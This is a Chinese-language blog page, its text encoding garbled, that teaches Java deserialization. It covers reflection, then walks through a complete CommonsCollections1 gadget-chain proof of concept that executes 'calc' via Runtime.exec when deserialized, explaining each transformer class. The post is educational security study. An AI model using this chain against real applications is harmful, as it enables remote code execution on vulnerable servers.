<!DOCTYPE html>
<html lang=ch>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°Javaå®‰å…¨ï¼Œé‚£ä¹ˆJavaååºåˆ—åŒ–å°±æ˜¯å¿…é¡»è¦è¿ˆè¿‡çš„å¤§å±±ï¼Œå¦‚æœæƒ³è¦è¿ˆè¿‡è¿™åº§å¤§å±±ï¼Œé‚£ä¹ˆå°±å¿…é¡»çŸ¥é“CommonsCollections1é“¾ã€‚ä½ çœ‹å¾ˆå½¢è±¡ï¼Œæˆ‘ä¸Šé¢è¿™æ®µè¯å°±æœ‰ååºåˆ—åŒ–é“¾çš„å‘³é“ã€‚ å½“ç„¶ï¼Œå¦‚æœæƒ³æ‘¸åˆ°ååºåˆ—åŒ–çš„é—¨æ§›ï¼Œå°±è¦å…ˆäº†è§£å‡ ä¸ªæœºåˆ¶ã€‚ ä¸€æ˜¯åå°„1234567public class SafeBox &#123;    &#x2F;&#x2F; ğŸ”’ ç§æœ‰å˜é‡ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œåªæœ‰åœ¨è¿™ä¸ªç±»å†…éƒ¨æ‰èƒ½è®¿é—®    p">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVAååºåˆ—åŒ–åˆæ¢">
<meta property="og:url" content="https://q1ng-li.github.io/2025/12/17/blog3/index.html">
<meta property="og:site_name" content="q1ng">
<meta property="og:description" content="ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°Javaå®‰å…¨ï¼Œé‚£ä¹ˆJavaååºåˆ—åŒ–å°±æ˜¯å¿…é¡»è¦è¿ˆè¿‡çš„å¤§å±±ï¼Œå¦‚æœæƒ³è¦è¿ˆè¿‡è¿™åº§å¤§å±±ï¼Œé‚£ä¹ˆå°±å¿…é¡»çŸ¥é“CommonsCollections1é“¾ã€‚ä½ çœ‹å¾ˆå½¢è±¡ï¼Œæˆ‘ä¸Šé¢è¿™æ®µè¯å°±æœ‰ååºåˆ—åŒ–é“¾çš„å‘³é“ã€‚ å½“ç„¶ï¼Œå¦‚æœæƒ³æ‘¸åˆ°ååºåˆ—åŒ–çš„é—¨æ§›ï¼Œå°±è¦å…ˆäº†è§£å‡ ä¸ªæœºåˆ¶ã€‚ ä¸€æ˜¯åå°„1234567public class SafeBox &#123;    &#x2F;&#x2F; ğŸ”’ ç§æœ‰å˜é‡ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œåªæœ‰åœ¨è¿™ä¸ªç±»å†…éƒ¨æ‰èƒ½è®¿é—®    p">
<meta property="og:locale" content="ch_CN">
<meta property="article:published_time" content="2025-12-17T10:06:36.000Z">
<meta property="article:modified_time" content="2025-12-19T10:24:47.510Z">
<meta property="article:author" content="q1ng">
<meta property="article:tag" content="javaä»£ç å®¡è®¡">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/1.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
          
        
    
    <!-- title -->
    <title>JAVAååºåˆ—åŒ–åˆæ¢</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">

    
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
    <!-- jquery -->
    
<script src="/lib/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <div class="banner">
<div id="blogtitel" class="blogtitel">q1ng</div>
<ul id="wrapper" class="wrapper">
  <div class="sun">
    <div class="star"></div>
  </div>
  <div class="mercury">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="venus">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="earth">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="mars">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="jupiter">
    <div class="planet"><div class="shadow"></div></div>
  </div>
</ul>
</div>

    <div class="background">
      
        <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/home/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2025/12/18/blog4/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
        
        
        <li><a class="icon" href="/2025/12/15/blog2/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2025/12/17/blog3/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2025/12/17/blog3/&text=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2025/12/17/blog3/&is_video=false&description=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JAVAååºåˆ—åŒ–åˆæ¢&body=Check out this article: https://q1ng-li.github.io/2025/12/17/blog3/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2025/12/17/blog3/&title=JAVAååºåˆ—åŒ–åˆæ¢"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2025/12/17/blog3/&name=JAVAååºåˆ—åŒ–åˆæ¢&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E6%98%AF%E5%8F%8D%E5%B0%84"><span class="toc-number">1.</span> <span class="toc-text">ä¸€æ˜¯åå°„</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">äºŒååºåˆ—åŒ–</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CommonsCollections1%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">CommonsCollections1é“¾</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">æ€»ç»“</span></a>
    </div>
  </span>
</div>

      
      <div class="content index width mx-auto px2 my4">
          
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        JAVAååºåˆ—åŒ–åˆæ¢
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">q1ng</span>
      </span>
      
    <div class="postdate">
        <time datetime="2025-12-17T10:06:36.000Z" itemprop="datePublished">2025-12-17</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link-link" href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">javaä»£ç å®¡è®¡</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°Javaå®‰å…¨ï¼Œé‚£ä¹ˆJavaååºåˆ—åŒ–å°±æ˜¯å¿…é¡»è¦è¿ˆè¿‡çš„å¤§å±±ï¼Œå¦‚æœæƒ³è¦è¿ˆè¿‡è¿™åº§å¤§å±±ï¼Œé‚£ä¹ˆå°±å¿…é¡»çŸ¥é“CommonsCollections1é“¾ã€‚ä½ çœ‹å¾ˆå½¢è±¡ï¼Œæˆ‘ä¸Šé¢è¿™æ®µè¯å°±æœ‰ååºåˆ—åŒ–é“¾çš„å‘³é“ã€‚</p>
<p>å½“ç„¶ï¼Œå¦‚æœæƒ³æ‘¸åˆ°ååºåˆ—åŒ–çš„é—¨æ§›ï¼Œå°±è¦å…ˆäº†è§£å‡ ä¸ªæœºåˆ¶ã€‚</p>
<h5 id="ä¸€æ˜¯åå°„"><a href="#ä¸€æ˜¯åå°„" class="headerlink" title="ä¸€æ˜¯åå°„"></a>ä¸€æ˜¯åå°„</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class SafeBox &#123;<br>    // ğŸ”’ ç§æœ‰å˜é‡ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œåªæœ‰åœ¨è¿™ä¸ªç±»å†…éƒ¨æ‰èƒ½è®¿é—®<br>    private String secret = &quot;æˆ‘æ˜¯åŸæœ¬çš„ç§˜å¯†&quot;;<br>    public void showSecret() &#123;<br>        System.out.println(&quot;å½“å‰ä¿é™©ç®±é‡Œçš„ç§˜å¯†æ˜¯ï¼š&quot; + this.secret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ç”Ÿæˆäº†ä¸€ä¸ªç±»ï¼Œè¿™é‡Œé¢ç±»çš„å±æ€§æ˜¯ç§æœ‰çš„ï¼Œé‚£ä¹ˆæˆ‘å¦‚ä½•èƒ½æ‹¿åˆ°è¿™ä¸ªç§æœ‰å±æ€§ï¼Œè¿™æ—¶å€™å°±è¦åˆ©ç”¨åå°„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Person p = new Person();<br>p.sayHello();<br>è¿™æ˜¯ä¸€ä¸ªæå…¶ç®€å•çš„å®šä¹‰ä¸€ä¸ªç±»ï¼Œå®ä¾‹åŒ–ï¼Œè°ƒç”¨æ–¹æ³•çš„æ“ä½œ<br><br>Class cls = Class.forName(&quot;Person&quot;);<br>Object obj = cls.newInstance();<br>Field f =cls.getField(&quot;age&quot;);<br>Method m = cls.getMethod(&quot;sayHello&quot;);<br>m.invoke(obj);<br></code></pre></td></tr></table></figure>

<p>è·å–å±æ€§ getField<br>è·å–ç±»çš„æ–¹æ³•ï¼š forName<br>å®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼š newInstance<br>è·å–å‡½æ•°çš„æ–¹æ³•ï¼š getMethod<br>æ‰§â¾å‡½æ•°çš„æ–¹æ³•ï¼š invoke</p>
<p>å¯¹äºç§æœ‰å±æ€§æ¥è¯´ï¼Œè·å–å±æ€§getDeclaredField</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.lang.reflect.Field;<br>public class Hacker&#123;<br>public static void main(String[] args) throws Exception &#123;<br>Class cls = Class.forName(&quot;SafeBox&quot;); //è·å–ç±»å<br>Object obj = cls.newInstance(); //è·å–å¯¹è±¡<br>Field f = cls.getDeclaredField(&quot;secret&quot;); //è·å–ç§æœ‰å±æ€§<br>f.setAccessible(true); // ä¿®æ”¹å®ƒçš„ä½œç”¨åŸŸ<br>Object secretValue = f.get(obj); <br>System.out.println(&quot;çªƒå–åˆ°çš„ç§˜å¯†æ˜¯: &quot; + secretValue);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™æ ·æœ€åå°±è¾“å‡º   çªƒå–åˆ°çš„ç§˜å¯†æ˜¯: æˆ‘æ˜¯åŸæœ¬çš„ç§˜å¯†</p>
<h5 id="äºŒååºåˆ—åŒ–"><a href="#äºŒååºåˆ—åŒ–" class="headerlink" title="äºŒååºåˆ—åŒ–"></a>äºŒååºåˆ—åŒ–</h5><p>ç®€å•æ¥è¯´ï¼Œç±»æ¯”åˆ°phpååºåˆ—åŒ–ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œphpçš„unserializeå‡½æ•°ä¼šè§¦å‘_<em>wakeup</em>_,ä½œä¸ºä¸€æ¬¡ååºåˆ—åŒ–çš„å…¥å£å‡½æ•°ã€‚é‚£ä¹ˆè°ˆåˆ°Javaååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–ä¼šè§¦å‘readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šå¯»æ‰¾è¿™æ ·çš„ç±»ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£ã€‚</p>
<h4 id="CommonsCollections1é“¾"><a href="#CommonsCollections1é“¾" class="headerlink" title="CommonsCollections1é“¾"></a>CommonsCollections1é“¾</h4><p>æ¥ä¸‹æ¥å°±ä»‹ç»ä¸‹è¿™ä¸ªå¤§åé¼é¼çš„CommonsCollections1é“¾ï¼Œé¦–å…ˆç”±äºç¯å¢ƒé™åˆ¶ï¼ŒJDK ç‰ˆæœ¬å¿…é¡» <strong>ä½äº 8u71</strong>ï¼Œå¹¶ä¸”ä¸‹è½½commons-collections-3.2.1.jar</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.ConstantTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.map.TransformedMap;<br><br>import java.io.*;<br>import java.lang.annotation.Retention;<br>import java.lang.reflect.Constructor;<br>import java.util.HashMap;<br>import java.util.Map;<br><br>public class CC1TransformedMapExploit &#123;<br><br>    public static void main(String[] args) throws Exception &#123;<br>        Transformer[] transformers = new Transformer[] &#123;<br>                new ConstantTransformer(Runtime.class),<br>                new InvokerTransformer(&quot;getMethod&quot;,<br>                        new Class[] &#123;String.class, Class[].class &#125;,<br>                        new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),<br>                new InvokerTransformer(&quot;invoke&quot;,<br>                        new Class[] &#123;Object.class, Object[].class &#125;,<br>                        new Object[] &#123;null, new Object[0] &#125;),<br>                new InvokerTransformer(&quot;exec&quot;,<br>                        new Class[] &#123;String.class &#125;,<br>                        new Object[] &#123;&quot;calc&quot; &#125;)<br>        &#125;;<br>        Transformer transformerChain = new ChainedTransformer(transformers);<br><br>        Map&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();<br>        // å…³é”®ç‚¹ A: Key å¿…é¡»æ˜¯ &quot;value&quot;<br>        // å› ä¸ºæˆ‘ä»¬åé¢è¦ç”¨ Retention.class è¿™ä¸ªæ³¨è§£ï¼Œå®ƒçš„æˆå‘˜æ–¹æ³•åæ˜¯ value()<br>        // AnnotationInvocationHandler åªæœ‰åœ¨ key åŒ¹é…æ–¹æ³•åæ—¶æ‰ä¼šå¤„ç†<br>        innerMap.put(&quot;value&quot;, &quot;uselessString&quot;);<br><br>        // 2.2 å°†å…¶åŒ…è£…ä¸º TransformedMap<br>        // å‚æ•°1: è¢«åŒ…è£…çš„ Map<br>        // å‚æ•°2: keyTransformer (æˆ‘ä»¬ä¸éœ€è¦è½¬æ¢ Keyï¼Œä¼  null)<br>        // å‚æ•°3: valueTransformer (å½“å€¼è¢«ä¿®æ”¹æ—¶ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„åˆ©ç”¨é“¾)<br>        Map transformedMap = TransformedMap.decorate(innerMap, null, transformerChain);<br><br>        // ==========================================<br>        // 3. å‡†å¤‡ Entry Point - AnnotationInvocationHandler<br>        // ==========================================<br>        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(true);<br><br>        // å…³é”®ç‚¹ B: ä¼ å…¥ Retention.class<br>        // Retention æ³¨è§£æœ‰ä¸€ä¸ªå±æ€§å« valueï¼Œç±»å‹æ˜¯ RetentionPolicy<br>        // æˆ‘ä»¬åœ¨ Map é‡Œå­˜çš„ key æ˜¯ &quot;value&quot;ï¼Œä½†å€¼æ˜¯ &quot;uselessString&quot; (Stringç±»å‹)<br>        // åœ¨ readObject æ—¶ï¼ŒHandler å‘ç° String ä¸æ˜¯ RetentionPolicyï¼Œå°±ä¼šå°è¯• setValue<br>        // ä»è€Œè§¦å‘ TransformedMap çš„å˜æ¢<br>        Object payload = constructor.newInstance(Retention.class, transformedMap);<br><br>        // ==========================================<br>        // 4. åºåˆ—åŒ–ä¸ååºåˆ—åŒ–<br>        // ==========================================<br><br>        // åºåˆ—åŒ–<br>        ByteArrayOutputStream barr = new ByteArrayOutputStream();<br>        ObjectOutputStream oos = new ObjectOutputStream(barr);<br>        oos.writeObject(payload);<br>        oos.close();<br><br>        System.out.println(&quot;Payload ç”ŸæˆæˆåŠŸ!&quot;);<br><br>        System.out.println(&quot;å¼€å§‹ååºåˆ—åŒ–...&quot;);<br>        ByteArrayInputStream bis = new ByteArrayInputStream(barr.toByteArray());<br>        ObjectInputStream ois = new ObjectInputStream(bis);<br>        ois.readObject(); // æ­¤æ—¶è®¡ç®—å™¨å¼¹å‡º<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>â‘ ConstantTransformerç±»</strong></p>
<p>çœ‹åˆ°ä¸Šæ–‡çš„pocä¸­ï¼Œåˆå§‹åŒ–äº†ConstantTransformerï¼Œçœ‹çœ‹å®ƒçš„æ„é€ æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public ConstantTransformer(Object constantToReturn) &#123;<br>        this.iConstant = constantToReturn;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>new ConstantTransformer(Runtime.class) ,å³ this.iConstant&#x3D;Runtime.class  æ˜¯ä¸€ä¸ªå¯¹è±¡</p>
<p><strong>â‘¡InvokerTransformerç±»</strong></p>
<p>ä¸Šæ–‡çš„pocå®ä¾‹åŒ–äº†ä¸‰æ¬¡InvokerTransformerï¼ŒåŒæ ·çœ‹çœ‹å®ƒçš„æ„é€ æ–¹æ³•ï¼Œè¿™ä¸ªç±»æœ‰å¾ˆå¤šæ„é€ æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äºå‚æ•°çš„ä¸ªæ•°ã€‚æ ¹æ®ä¸Šæ–‡å‚æ•°ä¸ªæ•°ï¼Œæ‰¾åˆ°ç›¸åº”çš„æ„é€ æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;<br>    this.iMethodName = methodName;<br>    this.iParamTypes = paramTypes;<br>    this.iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">new InvokerTransformer(&quot;getMethod&quot;,<br>                       new Class[] &#123;String.class, Class[].class &#125;,<br>                       new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªä»£ç ç›®çš„æ˜¯è·å¾—Runtimeç±»é‡Œçš„getRuntime(ä¸€ç§åå°„å†™æ³•),å³ Method m &#x3D; Runtime.class.getMethod(â€œgetRuntimeâ€,new Class[0])</p>
<p>new Class[] {String.class, Class[].class } è¿™ä¹ˆå†™åŸå› æ˜¯,æˆ‘ä»¬æ˜¯åœ¨é€šè¿‡åå°„è°ƒç”¨ <code>Class</code> ç±»ä¸­çš„ <code>getMethod</code> æ–¹æ³•ã€‚å› ä¸º <code>getMethod</code> æœ‰å¾ˆå¤šåŒåæ–¹æ³•ï¼ˆé‡è½½ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®å‘Šè¯‰ Javaï¼šæˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ª <code>getMethod</code>ï¼Œå®ƒçš„å‚æ•°ç­¾åæ˜¯ <code>(String name, Class... parameterTypes)</code></p>
<p>å…¶æ¬¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">new InvokerTransformer(&quot;invoke&quot;,<br>                        new Class[] &#123;Object.class, Object[].class &#125;,<br>                        new Object[] &#123;null, new Object[0] &#125;),<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªä»£ç è¡¨ç¤ºè·å–æ–¹æ³•mçš„invokeï¼Œæˆ‘ä»¬å¯ä»¥å›å¤´çœ‹çœ‹åå°„ä¸Šm.invoke(obj)å°±æ˜¯æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå³m.invoke(null)ï¼Œè¿™é‡Œå¯¹äºé™æ€æ–¹æ³•æ¥è¯´ï¼Œå¯ä»¥ä¼ å…¥null ã€‚è¿™æ­¥çš„ç›®çš„æ˜¯ è¿”å›äº† <strong>Runtime ç±»çš„å•ä¾‹å¯¹è±¡</strong>ï¼›è‡³æ­¤ï¼Œä¸çŸ¥é“å¤§å®¶è¿™é‡Œä¼šä¸ä¼šç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆä¸ç”¨newInstanceç›´æ¥è·å¾—å®ä¾‹ï¼Œè¿˜éœ€è¦å¤§è´¹å‘¨ç« çš„å‰é¢çš„é“ºå«ã€‚çœ‹äº†på¸ˆå‚…çš„æ–‡ç« æ˜ç™½ï¼ŒRuntimeç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œå¿…é¡»è¦ç”¨åˆ°getRuntime() æ¥è·å–åˆ° Runtime å¯¹è±¡</p>
<p>æœ€å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">new InvokerTransformer(&quot;exec&quot;,<br>                        new Class[] &#123;String.class &#125;,<br>                        new Object[] &#123;&quot;calc&quot; &#125;)<br></code></pre></td></tr></table></figure>

<p>ä¸Šä¸€æ­¥æ‹¿åˆ°äº†å¯¹è±¡ï¼Œç°åœ¨ç»ˆäºå¯ä»¥å¼¹è®¡ç®—å™¨äº†ã€‚ Runtime.getRuntime().exec(â€˜calcâ€™);</p>
<p><strong>â‘¢ChainedTransformerç±»</strong></p>
<p>å¯èƒ½å¤§å®¶ä¸è§£ï¼Œä¸ºä»€ä¹ˆä¸Šè¿°å¯ä»¥å®Œæˆå‰è€…çš„è¾“å‡ºä½œä¸ºåè€…çš„è¾“å…¥è¿™æ ·çš„è¿­ä»£æ“ä½œï¼Œè¿™ä¸ªæ—¶å€™å°±ä¸å¾—ä¸æåˆ°ChainedTransformerç±»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class ChainedTransformer implements Transformer, Serializable &#123;<br>    <br>    // å­˜æ”¾æˆ‘ä»¬åœ¨æ•°ç»„é‡Œå®šä¹‰çš„é‚£å † transformer (Constant, Invoker...)<br>    private final Transformer[] iTransformers;<br><br>    public ChainedTransformer(Transformer[] transformers) &#123;<br>        this.iTransformers = transformers;<br>    &#125;<br><br>    // ã€æ ¸å¿ƒé€»è¾‘ã€‘<br>    public Object transform(Object object) &#123;<br>        // éå†æ•°ç»„<br>        for (int i = 0; i &lt; iTransformers.length; i++) &#123;<br>            // å…³é”®ç‚¹ï¼š<br>            // 1. è°ƒç”¨ç¬¬ i ä¸ª transformer çš„ transform æ–¹æ³•<br>            // 2. å°†ç»“æœèµ‹å€¼å› object å˜é‡ï¼<br>            // 3. ä¸‹æ¬¡å¾ªç¯æ—¶ï¼Œä¼ å…¥çš„å°±æ˜¯è¿™ä¸ªæ›´æ–°åçš„ object<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        return object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

